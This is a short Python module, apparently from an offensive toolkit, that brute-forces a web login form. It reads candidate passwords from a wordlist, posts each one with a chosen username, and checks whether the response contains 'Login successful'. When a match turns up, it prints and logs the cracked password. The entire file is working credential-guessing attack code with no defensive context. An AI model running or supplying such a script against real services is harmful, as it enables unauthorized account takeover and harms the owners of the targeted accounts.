import requests
from utils.logger import log

def run(url, username, wordlist):
    print("\nStarting Brute Force...\n")
    
    with open(wordlist, "r") as f:
        for password in f:
            password = password.strip()
            data = {"username": username, "password": password}
            
            try:
                r = requests.post(url, data=data, timeout=5)
                if "Login successful" in r.text:
                    print(f"[+] Password Found: {password}")
                    log(f"Password found: {password}")
                    return password
                else:
                    print(f"[-] Trying: {password}")
            except requests.exceptions.RequestException as e:
                print(f"[!] Could not connect: {e}")